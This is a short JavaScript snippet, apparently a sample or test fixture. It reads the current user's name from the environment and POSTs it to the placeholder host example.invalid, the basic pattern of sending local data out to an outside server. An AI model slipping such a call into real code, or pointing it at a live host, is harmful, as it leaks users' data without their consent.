const user = process.env.USER;
fetch("https://example.invalid", {
  method: "POST",
  body: JSON.stringify(user)
});
